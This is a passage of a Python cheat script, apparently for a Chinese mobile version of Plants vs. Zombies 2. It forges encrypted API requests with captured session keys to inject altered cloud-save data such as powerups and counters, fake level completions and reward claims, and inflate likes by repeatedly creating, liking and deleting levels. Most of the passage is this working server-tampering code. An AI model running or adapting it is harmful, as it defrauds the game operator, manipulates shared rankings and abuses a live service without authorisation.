                first_de = gzip.decompress(base64.b64decode(p_value))
            except (base64.binascii.Error, gzip.BadGzipFile) as e:
                raise
            first_de = first_de.decode('utf-8')
            first_de = first_de.splitlines()
            result = ""
            for p_value_bytes in first_de:
                p_value_bytes = p_value_bytes.replace('-', '+').replace('_', '/').replace(',', '')
                p_value_bytes += '=' * (4 - (len(p_value_bytes) % 4))
        else:
            p_value_bytes = p_value.encode('utf-8')
            p_value_bytes = p_value_bytes.replace(b'-', b'+').replace(b'_', b'/').replace(b',', b'')
            p_value_bytes += b'=' * (4 - (len(p_value_bytes) % 4))
        try:
            decoded_p_value_dict = json.loads(base64.b64decode(p_value_bytes).decode('utf-8'))
            decoded_p_value_dict["sd"]["c"] = -191782665
            compact_json = json.dumps(decoded_p_value_dict, separators=(',', ':'))
            md5_hash = hashlib.md5(compact_json.encode('utf-8'))
            encrypted_result_md5 = md5_hash.hexdigest()
            compact_json2 = base64.b64encode(compact_json.encode('utf-8'))
            compact_json3 = b'"' + compact_json2 + b'"'
            compact_json4 = compact_json3.decode('utf-8').replace('=', ',')
            compressed = zlib.compress(compact_json4.encode('utf-8'), wbits=31)
            compressed_base64 = base64.b64encode(compressed).decode('utf-8')
            compressed_base = compressed_base64.replace('+', '-').replace('/', '_').replace('=', ',')
            data = {"req": "V206", "e": {"m": encrypted_result_md5, "pi": pi, "pr": compressed_base, "s": s_value, "sk": sk, "ui": ui}, "ev": 3}
            encrypted_data, head = get_encrypted_data(data, url)
            response = _do_post(head, encrypted_data, data)
            response_data = json.loads(response.text)
            if response_data.get("r") == 20013:
                print("当前请求文本已过期，需重新抓包")
            elif response_data.get("r") == 0:
                    print("注入成功，请选择云端登录")
            else:
                    print("注入失败")
        except json.JSONDecodeError as e:
            print(f"解析解码后的p字段为字典出现错误: {e}")
            raise
    except Exception:
        pass
def run_sixtieth_script():
    pi, ui, sk = get_pi_sk(加密)
    data = {"req":"V303","e":{"al":[{"id":10888,"abi":0,"type":1,"config_version":1}],"ci":"93","cs":"0","pack":渠道,"pi":pi,"rv":"5","sk":sk,"ui":ui,"v":版本号},"ev":3}
    encrypted_data, head = get_encrypted_data(data, url)
    response = _do_post(head, encrypted_data, data)
    for i in range(5):
        data = {"req":"V1030","e":{"ba":{"d":{"plantlist":[["sunshroom","primalpeashooter","turkeypult","pumpkin","witchhazel","sunflower","wallnut","tallnut"],["birthsunflower","primalsunflower","twinsunflower","snapdragon","gatlingpea","torchwood","goldbloom","powerplant"]]}},"lct":"381961","li":0+i+1,"pi":pi,"rt":"0","sk":sk,"ss":"10000,10000","ui":ui,"wi":"1"},"ev":3}
        encrypted_data, head = get_encrypted_data(data, url)
        response = _do_post(head, encrypted_data, data)
        response_data = json.loads(response.text)
        if response_data.get("r") == 20013:
            print("当前请求文本已过期，需重新抓包")
        elif response_data.get("r") == 0:
            print("过关成功")
        else:
            print("过关失败")
    for i in range(15):
        data = {"req":"V1031","e":{"id":0+i+1,"pi":pi,"sk":sk,"ui":ui,"wi":"1"},"ev":3}
        encrypted_data, head = get_encrypted_data(data, url)
        response = _do_post(head, encrypted_data, data)
        response_data = json.loads(response.text)
        if response_data.get("r") == 20013:
            print("当前请求文本已过期，需重新抓包")
        elif response_data.get("r") == 0:
            print("奖励领取成功")
        elif response_data.get("r") == 75512:
            print("奖励已领取")
        else:
            print("未知错误")
def run_sixtieth_first_script():
    pi, ui, sk = get_pi_sk(加密)
    data = {"req": "V720", "e": {"checksum": "f21e7f01e81330d463b8c82827dcdea7772db7a82e833599fe69459d59a771ae", "ci": "c083258ed7e8fe4e1636629bab540897", "dl": "1", "id": "0", "lvd": "H4sIAAAAAAAAA-1d23biuBL9oXnwJZ4-fgwJNngFszAg23pDdtIGZIc13Pn6UyXJYCCcTvr09HRP9JAVsFXy1q32roq7-nkfzLuzxZduGS7pQ_fP532QMDsQn7slqZ6TltGdbqcjn1g03gWRuN7b9h97-3BUcPqY875PeeiPd-GsZ4WzrpOW3jQcDaDN3G7YDtIkKFjSm_ar5ZT43GD-eNqfdqdPD0GbJuEsK_k29_mGTeEZ0-6yO9_xvCTLUUVWaUn23dnrFtqOct_bQ7s1NUMT2_Zm93g9SRPKI98z0qEYxyjzPZvNww1rkzWOp_ewnY7tVpFbziOzdrIfdZ1YnkVJuKWxM5_ETjX23QWrooCV4Z7GJmfVYNqf3S-7PC8AE_QNfQoMrQ20N7J9ox8cI1996c5x3I5BOnxLh_J-XLowFs6xfWwvj9_rNt0qMnPf3U9ib5lYeZGVeQE4zDQR8zRhljmdxGTAfG9GSbDJ1XPlHG8Bo-c-dd7oF-eTLzYsDhaUtJZpHPJx6dowp6ve8CfYf8-4fgau_9e-dHhuh9s0afGMu7D2Ec9Kb437vm479ndFapEhszPo57Sv4Rm7XsdYwl6txz-G88bh-vSm_dTYwXz1KOx1hns3-XvsaZw7WSd6oZa3h5913iFFdnuuDj8D008ek_FrjcnM4XuL-tFC-MjSW2J7OEMls9y58o0e7Kt1Lv34KAVfNrajTVYawucOLHeZx-Y6guuqPfpBk8XOmS8881F7PJ-3fxI4I0f_Bnu5y8PtJIYzwINiEt996LngmxfUJ3tob578bd2fWqOxU7BY8sYLPBv8NHCBtxQcxlubrIoK1gaf3yErwQ0PpzZqXfH5A-A4I413p3WoAPs8WrDSHeYKdwT-nZnSFz2N2oAF7sckgDnnWUULsS4Pd1uBo_QWig8KwOBIPKGdJuFrWpHZxNrxDLgoBz4QviXB59E9s0ODWHxdcy9wyVzMu2m6iBM5M7UK8J1kmMZ8Lfqdq_HNJa89jTxs-4C-c2IUG8Grat6RO9U-CTIj2qdxXtF4IPaXwG1DP7G7rtdc4TbguUa9buincG-xMlLrBvMzmy_rdmpe6zbKz43P_Bzc60NfBzX_1-egMt2X4e77OPOf5gBtr-21_bvskS8GcTSfJOBLLfDlHrZ3DFq6m1qjR8h56P_Bh42Bp6kXGuCvV2_5Pmxf-yngOvC9NW8oPEKLLwXP3vzhyFuRk6HfnLXQl4K-53OaBDd97u3nKr46-fpto7_a7_VTiCmOvFPzluSAmpsavvb-1MY7af6a107rECD2NnDIZlwRhVtyWkNTjCfw7CHOeRJYqViX-7XkbuRsbJ8j7xjPKo7KLe8w8QMztVZLsHlkttQYinf8rHQPuZeDnVwzwWcdEQPlkqM94J3wNQdtjDyJvAz91hrAE3aKjwYlaqBVF-7x47y3HZMRuU-GSdgGfV1Ri8yPPMohDozNDavXvMaN2qKpBaB_1CANXnOO8aR3ijmwjdq_5pkGw70MfFrHetfnIHBfpM6TOsyr99TlfoTY8HheVJvp7ThIaI8Glwqe1PbaXtv_M_YEtbs3B71vTEA7g6_G9uvcpxtmKR5QOlbp6QJ08QjzH2z4hu8T7ZWfUpr6QieDbl4wwbM3fwKMD2s9LWMSFU_d9Lm3n1vz1dHXN-Oz2u-NSm_V4B3FW1vJ24qbGr62GXepGKHJa6d1QOwq9jIVbslpDU1BfL6iYw5zTvZ5ifEf9C-5Gzlb5fDAr3fmEo-dF5lVTPM4_Is1Y0zFO1EVbDI7EvGXXDPks0jMeyI4BuK6EuKrDjFgX9yKbVVcF6AG-mvou0t6Wm-Mf-Q-afND1AkKauW8Eb-N4P4KNJFa87HCjdqiGXfhXgQN0uC1vlhr0U7Nq2qjOC0802B4D_gUeajJS41z8JKYQudJHRYd99TlfvwVczzaXttre51P1PlEnU_U-URtr-3_3fY6n6jziTqfqPOJ2l7b_7b2Op-o84k6n6jzidpe2_-29jqfqPOJOp-o84naXtv_vvY6n6jziTqfqPOJ2l7b_7b2Op-o84k6n6jzidpe2_-29jqfqPOJ__J8IhFjHtGYzAelt54YUZH7bTkWGWf2JkloCI5H7J2AZxYxRj4_4B760F4dinzAGvA5sBeO_Yp4Hjlf6JtT3J_asA8sp2S-a1NZoyOhMa8mHdyn423zrIr16KCmEvMuxnjSXph7yfkkzl_rfX-Zr9F2P84O1zyydpsU_OXxep27sIqC-TvOylzlLuBcW-F-krREnFD758gnB1j_RdYB31s2ckHT8z4atXZ6cO4N1Hh1jkXpPZGrOYs9pJ-_ruGDvnRuwlkWmvaL-tzJSq78w3L79Hi_hPGe__aMZXx44zr8ToY79tb1p8dW_uR9R3_qvAJ2I49JmCaL2n9w0MxrWronPQ7x1STetbEmUdPHCN1vk1O8IfR2tMjE3IVSx8q4Q-STIqwtVHOTaZz08Pj0vG_FXS8iHsFzHLRpDGe2XiPlT9Q-O_qE98RxWUn40Q8JXKIuEow3KlR8gt8vdfjl9-s49i29fxYPX-dv38pzNfPAb-iMN_zxmV7RuDSuH4zLzM-ec5Vn_WzzoXF9WlzEPHvO5d_NP918aFyfFldynifR-kjj-qS4tD7SuDQurY80Lo1L6yONS-PS-kjj0ri0PtK4NC6tjzQujesb-kj-fX7ILK_5TtEI_-bOfNLF98PEu0BvvZ_QeL_36fr_EhLfL3lG847G9Vlx4XtGQ987nL-TuSjTeHegmpM0Lo1LcBJc76ZJeP4OXEkL1gm5juc1Lo0L43l8X7IoMvP831rT0ltmFtGxvsalcWnNpXFpXFpzaVwal9Zceg01Lq25frG50rg-Ky6tuTQujUtrLo1L4_q7NZepajbKGh-spJvG3_pj4CA-qAKexiueydpc4SR26vor0D7izw91zTSzeK5rp8z5mvrkrsZFSu_Q_Df20E-zztR1TYZGPU055mZtxfPaGrKOQl3zpSXWoVlPWHxu1H0R9WPqOmcdsQafAkuSYM1lrHe54yyGZ2LNzmp5vfbgJyMb9pf3VdWMy_eTOKLQ5_7poj7m-XiCV8C7Znb4moEvZkN5Jk59tT_SF9bXWbKKGOqciNoVMbQN91vV5xz67F7WiTmfs6q1wfoScMYWrBzL8yMxpND-DtrLfnF9phd10y7mM_NdI00iOHuwj4fyXAkcbW7Q2Lwxf92PjLnKSs-iSQh4HZ5YpIKxXI2_95Hxl_levGtjA-6SvNA4d7LO4HIejI_Mw3PNqTAfWOckscMt1ty5WqfhR9ap1rO4XnzDuHuAZ3L6cLmH0o_M55_Kt26ZLeoPv2R2i-M7S_9zH1zWz7vcB9ZO1JlKrAhr-ryw2MXaievL8fcfmuO__8b4w6WsU-XOmZ2vE8vc4DPY9HL8X5vjP3xj_Acm6zq-5EnrnTgH78VpZp67YhZ8Lu8u59Nuzmf48M75tMn29rizHz7ucz_S_kHrc4Zz-16c1Hdt2POn-SRv16ZJVK0wJurj_Ef6b_zuh_j-3VFbZKdrL6nl2mnpOsgH0lZcb3B9XQt6d8n_AxgrjBnOjk8u73msBC5KsK6lrBc2TMLzaypehbYPecJHwFtY75JjnWmp0bHGV2A-k3P9nncCk2J9pYo4o1jWy-pX0T6PieCvUUmM3HL3E0Ou13Bc1zZ1eN7JN1m5knPePvLsoeftzN5ji4em-F3I3_dOj8vrfSK-38l29w5V10N1vS_tp-G-23xOwuxgSZt1n68w4D4Z13U463swT94U5rSNe4n5btEc92l8npn7xSabn-mFPk0iG5771yAhxsR390OfFLQTvoKPC6K6hlXdhwm-D_v3yVzUUD3qiCMWkvlYJ-3yvppbfMczqXUAxFoGBR7lhwm0P55psTZjFYudnnfUmMKfujP4fPWs3ig79EeDXX-U7ZF3UIs8E6yTh3PWdZ5mXw_9x3ujZ4N2Gfzxx38BpT0C7GCTAAA,", "n": "30\u79d2\u901f\u5237", "pi": pi, "pk": "1", "s": "30", "sk": sk, "ui": ui, "w": "0"}, "ev": 3}
    encrypted_data, head = get_encrypted_data(data, url)
    response = _do_post(head, encrypted_data, data)
    response_data = json.loads(response.text)
    if response_data.get("r") == 20013:
        print("请求文本已过期")
    elif response_data.get("r") == 0:
        print("关卡创立成功")
        decrypted_response = get_decrypted_data(url, data=response)
        decrypted_json = json.loads(decrypted_response)
        custom_id = int(decrypted_json['e']['d']['i'])
        data = {"req":"V734","e":{"id":custom_id,"pi":pi,"sk":sk,"ui":ui},"ev":3}
        encrypted_data, head = get_encrypted_data(data, url)
        response = _do_post(head, encrypted_data, data)
        decrypted_response = get_decrypted_data(url, data=response)
        decrypted_json = json.loads(decrypted_response)
        ls_list = decrypted_json['e']['d']['ls']
        for item in ls_list:
            level_id = item['i']
            level_name = item['n']
            like_count = item['l']
            play_count = item['pc']
            create_time = item['ra']
            print(f""" 关卡id: {level_id}
 关卡名称: {level_name}
 点赞数: {like_count}
 游玩数: {play_count}
 创建时间: {create_time}""")
            print()
        level_ids = [item['i'] for item in decrypted_json['e']['d']['ls']]
        print("当前的关卡id列表:", level_ids)
        data = {"req": "V727", "e": {"id": custom_id, "pi": pi, "sk": sk, "ui": ui}, "ev": 3}
        encrypted_data, head = get_encrypted_data(data, url)
        response = _do_post(head, encrypted_data, data)
        response_data = json.loads(response.text)
        if response_data.get("r") == 20013:
            print("当前请求文本已过期，需重新抓包")
        elif response_data.get("r") == 0:
            print("关卡删除成功")
        else:
            print("关卡删除失败")
        choice = input("请输入1全删除，输入2选择删除: ")
        if choice == "2":
            while True:
                index_input = input("请输入要删除的关卡序号（从0开始为第一个，按回车结束）: ")
                if index_input.strip() == "":
                    print("操作终止")
                    break
                try:
                    index = int(index_input)
                    if 0 <= index < len(level_ids):
                        selected_id = level_ids[index]
                        data = {"req": "V727", "e": {"id": selected_id, "pi": pi, "sk": sk, "ui": ui}, "ev": 3}
                        encrypted_data, head = get_encrypted_data(data, url)
                        response = _do_post(head, encrypted_data, data)
                        response_data = json.loads(response.text)
                        if response_data.get("r") == 20013:
                            print("当前请求文本已过期，需重新抓包")
                        elif response_data.get("r") == 0:
                            print("关卡删除成功")
                        else:
                            print("关卡删除失败")
                    else:
                        print("输入的序号超出范围，请重新输入")
                except ValueError:
                    print("请输入有效的数字序号或回车结束")
        elif choice == "1":
            for selected_id in level_ids:
                data = {"req": "V727", "e": {"id": selected_id, "pi": pi, "sk": sk, "ui": ui}, "ev": 3}
                encrypted_data, head = get_encrypted_data(data, url)
                response = _do_post(head, encrypted_data, data)
                response_data = json.loads(response.text)
                if response_data.get("r") == 20013:
                    print("当前请求文本已过期，需重新抓包")
                elif response_data.get("r") == 0:
                    print("关卡删除成功")
                else:
                    print("关卡删除失败")
    else:
        print("关卡创立失败")

def run_garden_like():
    """庭院点赞：单账号循环点赞（创建关卡 -> 点赞 -> 删除关卡）"""
    import time as _time_lib

    pi, ui, sk = get_pi_sk(加密)

    print("\n===== 庭院点赞(循环) =====")

    try:
        loop_input = input("请输入循环点赞次数（回车默认10次）: ").strip()
        loop_count = int(loop_input) if loop_input else 10
    except (ValueError, EOFError):
        loop_count = 10
    if loop_count < 1:
        loop_count = 1

    print(f"\n开始循环点赞，共{loop_count}次")

    success_total = 0
    for i in range(loop_count):
        # 每次循环创建新关卡
        create_data = {"req": "V720", "e": {
            "checksum": "f21e7f01e81330d463b8c82827dcdea7772db7a82e833599fe69459d59a771ae",
            "ci": "c083258ed7e8fe4e1636629bab540897",
            "dl": "1", "id": "0",
            "lvd": "H4sIAAAAAAAAA-1d23biuBL9oXnwJZ4-fgwJNngFszAg23pDdtIGZIc13Pn6UyXJYCCcTvr09HRP9JAVsFXy1q32roq7-nkfzLuzxZduGS7pQ_fP532QMDsQn7slqZ6TltGdbqcjn1g03gWRuN7b9h97-3BUcPqY875PeeiPd-GsZ4WzrpOW3jQcDaDN3G7YDtIkKFjSm_ar5ZT43GD-eNqfdqdPD0GbJuEsK_k29_mGTeEZ0-6yO9_xvCTLUUVWaUn23dnrFtqOct_bQ7s1NUMT2_Zm93g9SRPKI98z0qEYxyjzPZvNww1rkzWOp_ewnY7tVpFbziOzdrIfdZ1YnkVJuKWxM5_ETjX23QWrooCV4Z7GJmfVYNqf3S-7PC8AE_QNfQoMrQ20N7J9ox8cI1996c5x3I5BOnxLh_J-XLowFs6xfWwvj9_rNt0qMnPf3U9ib5lYeZGVeQE4zDQR8zRhljmdxGTAfG9GSbDJ1XPlHG8Bo-c-dd7oF-eTLzYsDhaUtJZpHPJx6dowp6ve8CfYf8-4fgau_9e-dHhuh9s0afGMu7D2Ec9Kb437vm479ndFapEhszPo57Sv4Rm7XsdYwl6txz-G88bh-vSm_dTYwXz1KOx1hns3-XvsaZw7WSd6oZa3h5913iFFdnuuDj8D008ek_FrjcnM4XuL-tFC-MjSW2J7OEMls9y58o0e7Kt1Lv34KAVfNrajTVYawucOLHeZx-Y6guuqPfpBk8XOmS8881F7PJ-3fxI4I0f_Bnu5y8PtJIYzwINiEt996LngmxfUJ3tob578bd2fWqOxU7BY8sYLPBv8NHCBtxQcxlubrIoK1gaf3yErwQ0PpzZqXfH5A-A4I413p3WoAPs8WrDSHeYKdwT-nZnSFz2N2oAF7sckgDnnWUULsS4Pd1uBo_QWig8KwOBIPKGdJuFrWpHZxNrxDLgoBz4QviXB59E9s0ODWHxdcy9wyVzMu2m6iBM5M7UK8J1kmMZ8Lfqdq_HNJa89jTxs-4C-c2IUG8Grat6RO9U-CTIj2qdxXtF4IPaXwG1DP7G7rtdc4TbguUa9buincG-xMlLrBvMzmy_rdmpe6zbKz43P_Bzc60NfBzX_1-egMt2X4e77OPOf5gBtr-21_bvskS8GcTSfJOBLLfDlHrZ3DFq6m1qjR8h56P_Bh42Bp6kXGuCvV2_5Pmxf-yngOvC9NW8oPEKLLwXP3vzhyFuRk6HfnLXQl4K-53OaBDd97u3nKr46-fpto7_a7_VTiCmOvFPzluSAmpsavvb-1MY7af6a107rECD2NnDIZlwRhVtyWkNTjCfw7CHOeRJYqViX-7XkbuRsbJ8j7xjPKo7KLe8w8QMztVZLsHlkttQYinf8rHQPuZeDnVwzwWcdEQPlkqM94J3wNQdtjDyJvAz91hrAE3aKjwYlaqBVF-7x47y3HZMRuU-GSdgGfV1Ri8yPPMohDozNDavXvMaN2qKpBaB_1CANXnOO8aR3ijmwjdq_5pkGw70MfFrHetfnIHBfpM6TOsyr99TlfoTY8HheVJvp7ThIaI8Glwqe1PbaXtv_M_YEtbs3B71vTEA7g6_G9uvcpxtmKR5QOlbp6QJ08QjzH2z4hu8T7ZWfUpr6QieDbl4wwbM3fwKMD2s9LWMSFU_d9Lm3n1vz1dHXN-Oz2u-NSm_V4B3FW1vJ24qbGr62GXepGKHJa6d1QOwq9jIVbslpDU1BfL6iYw5zTvZ5ifEf9C-5Gzlb5fDAr3fmEo-dF5lVTPM4_Is1Y0zFO1EVbDI7EvGXXDPks0jMeyI4BuK6EuKrDjFgX9yKbVVcF6AG-mvou0t6Wm-Mf-Q-afND1AkKauW8Eb-N4P4KNJFa87HCjdqiGXfhXgQN0uC1vlhr0U7Nq2qjOC0802B4D_gUeajJS41z8JKYQudJHRYd99TlfvwVczzaXttre51P1PlEnU_U-URtr-3_3fY6n6jziTqfqPOJ2l7b_7b2Op-o84k6n6jzidpe2_-29jqfqPOJOp-o84naXtv_vvY6n6jziTqfqPOJ2l7b_7b2Op-o84k6n6jzidpe2_-29jqfqPOJ__J8IhFjHtGYzAelt54YUZH7bTkWGWf2JkloCI5H7J2AZxYxRj4_4B760F4dinzAGvA5sBeO_Yp4Hjlf6JtT3J_asA8sp2S-a1NZoyOhMa8mHdyn423zrIr16KCmEvMuxnjSXph7yfkkzl_rfX-Zr9F2P84O1zyydpsU_OXxep27sIqC-TvOylzlLuBcW-F-krREnFD758gnB1j_RdYB31s2ckHT8z4atXZ6cO4N1Hh1jkXpPZGrOYs9pJ-_ruGDvnRuwlkWmvaL-tzJSq78w3L79Hi_hPGe__aMZXx44zr8ToY79tb1p8dW_uR9R3_qvAJ2I49JmCaL2n9w0MxrWronPQ7x1STetbEmUdPHCN1vk1O8IfR2tMjE3IVSx8q4Q-STIqwtVHOTaZz08Pj0vG_FXS8iHsFzHLRpDGe2XiPlT9Q-O_qE98RxWUn40Q8JXKIuEow3KlR8gt8vdfjl9-s49i29fxYPX-dv38pzNfPAb-iMN_zxmV7RuDSuH4zLzM-ec5Vn_WzzoXF9WlzEPHvO5d_NP918aFyfFldynifR-kjj-qS4tD7SuDQurY80Lo1L6yONS-PS-kjj0ri0PtK4NC6tjzQujesb-kj-fX7ILK_5TtEI_-bOfNLF98PEu0BvvZ_QeL_36fr_EhLfL3lG847G9Vlx4XtGQ987nL-TuSjTeHegmpM0Lo1LcBJc76ZJeP4OXEkL1gm5juc1Lo0L43l8X7IoMvP831rT0ltmFtGxvsalcWnNpXFpXFpzaVwal9Zceg01Lq25frG50rg-Ky6tuTQujUtrLo1L4_q7NZepajbKGh-spJvG3_pj4CA-qAKexiueydpc4SR26vor0D7izw91zTSzeK5rp8z5mvrkrsZFSu_Q_Df20E-zztR1TYZGPU055mZtxfPaGrKOQl3zpSXWoVlPWHxu1H0R9WPqOmcdsQafAkuSYM1lrHe54yyGZ2LNzmp5vfbgJyMb9pf3VdWMy_eTOKLQ5_7poj7m-XiCV8C7Znb4moEvZkN5Jk59tT_SF9bXWbKKGOqciNoVMbQN91vV5xz67F7WiTmfs6q1wfoScMYWrBzL8yMxpND-DtrLfnF9phd10y7mM_NdI00iOHuwj4fyXAkcbW7Q2Lwxf92PjLnKSs-iSQh4HZ5YpIKxXI2_95Hxl_levGtjA-6SvNA4d7LO4HIejI_Mw3PNqTAfWOckscMt1ty5WqfhR9ap1rO4XnzDuHuAZ3L6cLmH0o_M55_Kt26ZLeoPv2R2i-M7S_9zH1zWz7vcB9ZO1JlKrAhr-ryw2MXaievL8fcfmuO__8b4w6WsU-XOmZ2vE8vc4DPY9HL8X5vjP3xj_Acm6zq-5EnrnTgH78VpZp67YhZ8Lu8u59Nuzmf48M75tMn29rizHz7ucz_S_kHrc4Zz-16c1Hdt2POn-SRv16ZJVK0wJurj_Ef6b_zuh_j-3VFbZKdr6nl2mnpOsgH0lZcb3B9XQt6d8n_AxgrjBnOjk8u73msBC5KsK6lrBc2TMLzaypehbYPecJHwFtY75JjnWmp0bHGV2A-k3P9nncCk2J9pYo4o1jWy-pX0T6PieCvUUmM3HL3E0Ou13Bc1zZ1eN7JN1m5knPePvLsoeftzN5ji4em-F3I3_dOj8vrfSK-38l29w5V10N1vS_tp-G-23xOwuxgSZt1n68w4D4Z13U463swT94U5rSNe4n5btEc92l8npn7xSabn-mFPk0iG5771yAhxsR390OfFLQTvoKPC6K6hlXdhwm-D_v3yVzUUD3qiCMWkvlYJ-3yvppbfMczqXUAxFoGBR7lhwm0P55psTZjFYudnnfUmMKfujP4fPWs3ig79EeDXX-U7ZF3UIs8E6yTh3PWdZ5mXw_9x3ujZ4N2Gfzxx38BpT0C7GCTAAA,",
            "n": "30秒速刷", "pi": pi, "pk": "1", "s": "30", "sk": sk, "ui": ui, "w": "0"
        }, "ev": 3}
        try:
            enc_data, head = get_encrypted_data(create_data, url)
            resp = _do_post(head, enc_data, create_data)
            resp_data = json.loads(resp.text)
            if resp_data.get("r") != 0:
                print(f"  第{i+1}/{loop_count}次：关卡创建失败")
                continue
            dec_resp = get_decrypted_data(url, data=resp)
            dec_json = json.loads(dec_resp)
            cur_level_id = int(dec_json['e']['d']['i'])

            # 点赞
            like_data = {"req": "V722", "e": {
                "id": str(cur_level_id), "pi": pi, "sk": sk, "t": "1", "ui": ui, "ver_": 版本号
            }, "ev": 3}
            enc_data, head = get_encrypted_data(like_data, url)
            resp = _do_post(head, enc_data, like_data)
            resp_data = json.loads(resp.text)
            if resp_data.get("r") == 0:
                success_total += 1
                print(f"  第{i+1}/{loop_count}次：点赞成功")
            else:
                print(f"  第{i+1}/{loop_count}次：点赞失败")

            # 删除关卡
            del_data = {"req": "V727", "e": {"id": cur_level_id, "pi": pi, "sk": sk, "ui": ui}, "ev": 3}
            enc_data, head = get_encrypted_data(del_data, url)
            _do_post(head, enc_data, del_data)
        except Exception as e:
            print(f"  第{i+1}/{loop_count}次：异常 {e}")
        _time_lib.sleep(0.5)

    print(f"\n===== 庭院点赞完成，成功 {success_total}/{loop_count} 次 =====")

def run_sixtieth_second_script():
    pi, ui, sk = get_pi_sk(加密)
    data = {"req": "V203", "e": {"pi": pi, "sk": sk, "ui": ui}, "ev": 3}
    encrypted_data, head = get_encrypted_data(data, url)
    response = _do_post(head, encrypted_data, data)
    decrypted_response = get_decrypted_data(url, data=response)
    decrypted_json = json.loads(decrypted_response)
    try:
        inner_dict = decrypted_json["e"]["d"]["pr"]
        p_value = inner_dict["p"]
        s_value = inner_dict["s"]
        if pingtai == 'ios':
            p_value = p_value.replace('-', '+').replace('_', '/')
            p_value += '=' * (4 - (len(p_value) % 4))
            date = base64.b64decode(p_value)
            gzipp = gzip.decompress(date)
            try:
                first_de = gzip.decompress(base64.b64decode(p_value))
            except (base64.binascii.Error, gzip.BadGzipFile) as e:
                raise
            first_de = first_de.decode('utf-8')
            first_de = first_de.splitlines()
            result = ""
            for p_value_bytes in first_de:
                p_value_bytes = p_value_bytes.replace('-', '+').replace('_', '/').replace(',', '')
                p_value_bytes += '=' * (4 - (len(p_value_bytes) % 4))
        else:
            p_value_bytes = p_value.encode('utf-8')
            p_value_bytes = p_value_bytes.replace(b'-', b'+').replace(b'_', b'/').replace(b',', b'')
            p_value_bytes += b'=' * (4 - (len(p_value_bytes) % 4))
        try:
            decoded_p_value_dict = json.loads(base64.b64decode(p_value_bytes).decode('utf-8'))
            decoded_p_value_dict["sd"]["pr"] = []
            new_values = [{"n":"poweruptacticalcuke","i":30},{"n":"powerupvasebreakerreveal","i":0},{"n":"powerupvasebreakermove","i":0},{"n":"powerupvasebreakerbutter","i":0},{"n":"starting_sun_2","i":0},{"n":"monthlycard_tacticalcuke","i":0},{"n":"wallnut_firstaid","i":0},{"n":"upgrade_shovel_1","i":0},{"n":"upgrade_shovel_2","i":0},{"n":"starting_sun_1","i":0},{"n":"upgrade_7_slots","i":0},{"n":"upgrade_8_slots","i":0},{"n":"plantfood_extra_slot_1","i":0},{"n":"starting_sun_3","i":0},{"n":"upgrade_shovel_3","i":0},{"n":"starting_sun_4","i":0},{"n":"upgrade_shovel_4","i":0},{"n":"plantfood_extra_slot_3","i":0}]
            decoded_p_value_dict["sd"]["pr"].extend(new_values)
            compact_json = json.dumps(decoded_p_value_dict, separators=(',', ':'))
            md5_hash = hashlib.md5(compact_json.encode('utf-8'))
            encrypted_result_md5 = md5_hash.hexdigest()
            compact_json2 = base64.b64encode(compact_json.encode('utf-8'))
            compact_json3 = b'"' + compact_json2 + b'"'
            compact_json4 = compact_json3.decode('utf-8').replace('=', ',')
            compressed = zlib.compress(compact_json4.encode('utf-8'), wbits=31)
            compressed_base64 = base64.b64encode(compressed).decode('utf-8')
            compressed_base = compressed_base64.replace('+', '-').replace('/', '_').replace('=', ',')
            data = {"req": "V206", "e": {"m": encrypted_result_md5, "pi": pi, "pr": compressed_base, "s": s_value, "sk": sk, "ui": ui}, "ev": 3}
            encrypted_data, head = get_encrypted_data(data, url)
            response = _do_post(head, encrypted_data, data)
            response_data = json.loads(response.text)
            if response_data.get("r") == 20013:
                print("当前请求文本已过期，需重新抓包")
            elif response_data.get("r") == 0:
                    print("消除成功，请选择云端登录")
            else:
                    print("消除失败")
        except json.JSONDecodeError as e:
            print(f"解析解码后的p字段为字典出现错误: {e}")
            raise
    except Exception:
        pass
def run_sixtieth_third_script():
    pi, ui, sk = get_pi_sk(加密)
    data = {"req": "V203", "e": {"pi": pi, "sk": sk, "ui": ui}, "ev": 3}
    encrypted_data, head = get_encrypted_data(data, url)
    response = _do_post(head, encrypted_data, data)
    decrypted_response = get_decrypted_data(url, data=response)
    decrypted_json = json.loads(decrypted_response)
    try:
        inner_dict = decrypted_json["e"]["d"]["pr"]
        p_value = inner_dict["p"]
        s_value = inner_dict["s"]
        if pingtai == 'ios':
            p_value = p_value.replace('-', '+').replace('_', '/')
            p_value += '=' * (4 - (len(p_value) % 4))
            date = base64.b64decode(p_value)
            gzipp = gzip.decompress(date)
            try:
                first_de = gzip.decompress(base64.b64decode(p_value))
            except (base64.binascii.Error, gzip.BadGzipFile) as e:
                raise
            first_de = first_de.decode('utf-8')
            first_de = first_de.splitlines()
            result = ""
            for p_value_bytes in first_de:
                p_value_bytes = p_value_bytes.replace('-', '+').replace('_', '/').replace(',', '')
                p_value_bytes += '=' * (4 - (len(p_value_bytes) % 4))
        else:
            p_value_bytes = p_value.encode('utf-8')
            p_value_bytes = p_value_bytes.replace(b'-', b'+').replace(b'_', b'/').replace(b',', b'')
            p_value_bytes += b'=' * (4 - (len(p_value_bytes) % 4))
        try:
            decoded_p_value_dict = json.loads(base64.b64decode(p_value_bytes).decode('utf-8'))
            decoded_p_value_dict["sd"]["mct"] = 7
            compact_json = json.dumps(decoded_p_value_dict, separators=(',', ':'))
            md5_hash = hashlib.md5(compact_json.encode('utf-8'))
            encrypted_result_md5 = md5_hash.hexdigest()
            compact_json2 = base64.b64encode(compact_json.encode('utf-8'))
            compact_json3 = b'"' + compact_json2 + b'"'
            compact_json4 = compact_json3.decode('utf-8').replace('=', ',')
            compressed = zlib.compress(compact_json4.encode('utf-8'), wbits=31)
            compressed_base64 = base64.b64encode(compressed).decode('utf-8')
            compressed_base = compressed_base64.replace('+', '-').replace('/', '_').replace('=', ',')
            data = {"req": "V206", "e": {"m": encrypted_result_md5, "pi": pi, "pr": compressed_base, "s": s_value, "sk": sk, "ui": ui}, "ev": 3}
            encrypted_data, head = get_encrypted_data(data, url)
            response = _do_post(head, encrypted_data, data)
            response_data = json.loads(response.text)
            if response_data.get("r") == 20013:
                print("当前请求文本已过期，需重新抓包")
            elif response_data.get("r") == 0:
                    print("注入成功，请选择云端登录")
            else:
                    print("注入失败")
        except json.JSONDecodeError as e:
            print(f"解析解码后的p字段为字典出现错误: {e}")
            raise
    except Exception:
        pass
def run_sixtieth_fourth_script():
    pi, ui, sk = get_pi_sk(加密)
    data = {"req":"V303","e":{"al":[{"id":10859,"abi":0,"type":1,"config_version":1}],"ci":"93","cs":"0","pack":渠道,"pi":pi,"rv":"5","sk":sk,"ui":ui,"v":版本号},"ev":3}
